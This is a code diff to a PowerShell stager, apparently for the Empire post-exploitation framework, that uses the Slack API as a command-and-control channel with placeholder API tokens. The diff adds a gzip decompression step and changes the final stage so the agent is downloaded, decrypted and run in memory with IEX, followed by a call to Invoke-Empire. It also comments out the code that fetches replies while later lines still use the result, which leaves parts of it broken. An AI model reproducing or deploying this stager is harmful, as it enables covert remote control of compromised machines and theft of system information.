@@ -19,6 +19,16 @@ function Start-Negotiate {
         return [Convert]::ToBase64String($raw);
     }
 
+    function gunzip {param($data)
+        $input =  [System.IO.MemoryStream]::new($data);
+        $output = [System.IO.MemoryStream]::new();
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::DeCompress);
+
+          $gzipStream.CopyTo($output);
+          $gzipStream.Close();
+        return $output.ToArray();
+    }
+
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
@@ -177,9 +187,9 @@ function Start-Negotiate {
     #Write-Host "[*] Listener has finished sending the base64 string.";
 
     # listener has replied grab all replies
-    $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-    $slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
-    $slack_response2=ConvertFrom-Json20 $slack_response2;
+    #$wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
+    #$slack_response2=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+    #$slack_response2=ConvertFrom-Json20 $slack_response2;
 
     # should only be a single reply so lets assume only 1 reply
     $replies = $slack_response2["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
@@ -280,6 +290,7 @@ function Start-Negotiate {
     $wc.Headers.Add("User-Agent",$UA);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
+    start-sleep -seconds 2;
     $rc4p2_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p2));
     $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p2_base64&username=$($ID):5");
@@ -306,9 +317,9 @@ function Start-Negotiate {
     }
 
     # listener has replied grab all replies
-    $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
-    $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
-    $slack_response=ConvertFrom-Json20 $slack_response;
+    #$wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
+    #$slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
+    #$slack_response=ConvertFrom-Json20 $slack_response;
 
     $replies = $slack_response["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
     $replies_end = $replies.count - 2;
@@ -320,16 +331,16 @@ function Start-Negotiate {
     }
 
     # # decrypt the agent and register the agent logic
-    $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
-    #write-host "data len: $($Data.Length)";
-    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
+    $data = $e.GetString((gunzip (Decrypt-Bytes -Key $key -In $raw)));
+    write-host "data len: $($Data.Length)";
+    IEX $data;
 
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
-    # need to give slack 20 seconds else it buckles and you hit the rate limits
-    Start-Sleep -Seconds 20;
+    # need to give slack 10 seconds else it buckles and you hit the rate limits
+    Start-Sleep -Seconds 10;
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
